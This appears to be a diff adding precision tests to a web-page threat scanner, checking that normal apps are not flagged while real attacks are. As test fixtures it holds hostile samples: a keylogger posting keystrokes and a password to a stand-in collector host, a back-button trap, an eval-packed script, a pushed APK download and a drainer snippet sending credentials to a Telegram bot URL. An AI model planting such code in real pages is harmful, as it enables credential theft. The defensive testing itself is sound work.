@@ -245,3 +245,144 @@ pageTest('a hostile page cannot make the scan hang', () => {
     assert.ok(Date.now() - started < 4000, `the scan took ${Date.now() - started}ms`);
     assert.ok(report.score >= 0 && report.score <= 100);
 });
+
+/* ------------------------------------------------- precision on real apps */
+/*
+ * Version 2 rated google.com, an assistant and every other modern application
+ * F. The cause was the same in each case: a test asking whether two tokens
+ * appeared anywhere in a bundle, when what it meant to ask was whether they
+ * appeared together. These tests hold that line.
+ */
+
+pageTest('an ordinary web application is not mistaken for an attack', () => {
+    ['https://www.google.com/', 'https://claude.ai/chat/abc', 'https://workspace.example.com/app']
+        .forEach((url) => {
+            const report = fixture('webapp-sample', url);
+            assert.strictEqual(report.rating, 'A',
+                `${url} scored ${report.score}: ${idsOf(report).join(', ')}`);
+            assert.deepStrictEqual(idsOf(report), [], `${url} raised findings`);
+        });
+});
+
+pageTest('routing, lazy chunks and minified helpers are not evidence of anything', () => {
+    const report = fixture('webapp-sample', 'https://workspace.example.com/app');
+    ['keystroke-capture', 'history-trap', 'dynamic-script-injection', 'obfuscated-js',
+     'bot-cloaking', 'devtools-blocking', 'install-prompt', 'hidden-iframes'].forEach((id) => {
+        assert.ok(!idsOf(report).includes(id), `${id} fired on an ordinary application`);
+    });
+});
+
+pageTest('a page\'s own application is not "somebody else\'s installer"', () => {
+    // The app offers .pkg and .deb downloads from its own domain.
+    assert.ok(!idsOf(fixture('webapp-sample', 'https://workspace.example.com/app')).includes('install-prompt'));
+
+    const pushed = `<html><body><h1>Free video player</h1>
+        <a href="https://get-it-here.duckdns.org/player-setup.apk">Download now</a></body></html>`;
+    assert.ok(idsOf(scan('https://videos.example.com/watch', pushed)).includes('install-prompt'));
+});
+
+pageTest('a keylogger is a key listener that sends elsewhere, not one that formats a field', () => {
+    const checkout = `<html><body><form action="/pay">
+        <input name="cardnumber"><input name="cvv"><input type="password" name="pin">
+      </form>
+      <script>
+        var card = document.querySelector('[name=cardnumber]');
+        card.addEventListener('keyup', function (e) { e.target.value = e.target.value.replace(/\\D/g, ''); });
+        card.addEventListener('blur', function () { fetch('/validate', {method: 'POST', body: card.value}); });
+      <\/script></body></html>`;
+    assert.ok(!idsOf(scan('https://shop.example.com/checkout', checkout)).includes('keystroke-capture'),
+        'a card formatter is not a keylogger');
+
+    const logger = `<html><body><form><input type="password" id="p"></form>
+      <script>
+        document.addEventListener('keydown', function (e) {
+          fetch('https://collector.example.net/k?v=' + e.key + document.getElementById('p').value);
+        });
+      <\/script></body></html>`;
+    assert.ok(idsOf(scan('https://signin.example.com/', logger)).includes('keystroke-capture'),
+        'a real keylogger must still be caught');
+});
+
+pageTest('a router is not a back-button trap, but a trap still is', () => {
+    const router = `<html><body><script>
+        function go(u){ history.pushState({}, '', u); render(); }
+        window.addEventListener('popstate', function(){ render(); });
+        function render(){}
+      <\/script></body></html>`;
+    assert.ok(!idsOf(scan('https://app.example.com/', router)).includes('history-trap'));
+
+    const trap = `<html><body><script>
+        history.pushState(null, null, location.href);
+        window.onpopstate = function(){ history.go(1); };
+      <\/script></body></html>`;
+    assert.ok(idsOf(scan('https://alert.example.tk/', trap)).includes('history-trap'));
+});
+
+pageTest('minifying is not packing', () => {
+    const minified = `<html><body><script>
+        var d=function(s){return decodeURIComponent(escape(atob(s)))},
+            i={close:String.fromCharCode(99,108,111,115,101)},
+            t=d('Y3NyZi10b2tlbg==');
+      <\/script></body></html>`;
+    assert.ok(!idsOf(scan('https://app.example.com/', minified)).includes('obfuscated-js'));
+
+    const packed = `<html><body><script>
+        eval(atob('dmFyIHggPSAxOyBhbGVydCgneCcpOyB2YXIgeSA9IDI7IGRvY3VtZW50LndyaXRlKCdoaScpOw=='));
+      <\/script></body></html>`;
+    assert.ok(idsOf(scan('https://free-movies.example.tk/', packed)).includes('obfuscated-js'));
+});
+
+pageTest('an exchange warning you about your recovery phrase is not asking for it', () => {
+    const exchange = `<html><body><h1>Sign in</h1>
+        <form action="/auth"><input name="email"><input type="password" name="password"></form>
+        <p>We will never ask for your secret recovery phrase. Never share your seed phrase with anyone.</p>
+        <a href="/contact">Contact</a> <a href="/privacy">Privacy</a></body></html>`;
+    const report = scan('https://www.coinbase.com/signin', exchange);
+    assert.ok(!idsOf(report).includes('seed-phrase-harvest'));
+    assert.ok(report.score >= 90, `got ${report.score}: ${idsOf(report).join(', ')}`);
+
+    // A field that collects one is still conclusive.
+    assert.ok(idsOf(fixture('drainer-sample', 'https://metamask-validate.xyz/claim'))
+        .includes('seed-phrase-harvest'));
+});
+
+pageTest('a page explaining an attack is not performing it', () => {
+    // Code samples live in <pre>, not in <script>: they are prose about code.
+    const tutorial = `<html><head><title>How drainers work</title></head><body>
+        <h1>Anatomy of a wallet drainer</h1>
+        <pre><code>ethereum.request({method:'eth_requestAccounts'});
+token.setApprovalForAll(addr, true);
+fetch('https://api.telegram.org/bot123/sendMessage?text=' + creds);
+var s = document.createElement('script'); s.src = atob(payload);</code></pre>
+        <p>Routers at 192.168.1.1 expose /cgi-bin/luci, and victims are told to change your DNS.</p>
+        <a href="/about">About</a> <a href="/privacy">Privacy</a></body></html>`;
+    const report = scan('https://developer.example.org/docs/drainers', tutorial);
+    ['credential-exfil', 'wallet-drainer', 'router-attack', 'dns-change-instructions',
+     'dynamic-script-injection'].forEach((id) => {
+        assert.ok(!idsOf(report).includes(id), `${id} fired on an article about the attack`);
+    });
+    assert.ok(report.score >= 90, `got ${report.score}: ${idsOf(report).join(', ')}`);
+});
+
+pageTest('an ad-heavy newspaper with a subscription pitch stays out of the danger bands', () => {
+    let ads = '';
+    for (let i = 0; i < 11; i++) {
+        ads += `<div class="ad-slot" id="ad_${i}"><iframe src="https://ads.example.com/${i}" width="300" height="250"></iframe></div>`;
+    }
+    let pixels = '';
+    for (let i = 0; i < 4; i++) {
+        pixels += `<iframe src="https://pixel${i}.example.com/p" width="0" height="0" style="display:none"></iframe>`;
+    }
+    let trackers = '';
+    for (let i = 0; i < 9; i++) {
+        trackers += `<script src="https://cdn${i}.adnetwork-example.com/t.js"></script>`;
+    }
+    const html = `<html><head><title>Election result - Example News</title>${trackers}</head><body>
+        <h1>Election result confirmed</h1><p>${'Reporting from the capital. '.repeat(120)}</p>
+        ${ads}${pixels}
+        <p>Subscribe now for unlimited access. Limited time offer, lowest price of the year, order now.</p>
+        <a href="/contact">Contact</a> <a href="/privacy">Privacy</a></body></html>`;
+    const report = scan('https://www.examplenews.com/world/article-123', html);
+    assert.ok(report.hygienePenalty > 12, 'the nuisance findings should still be reported');
+    assert.ok(report.score >= 70, `an honest newspaper must stay clear of the danger bands, got ${report.score}`);
+});
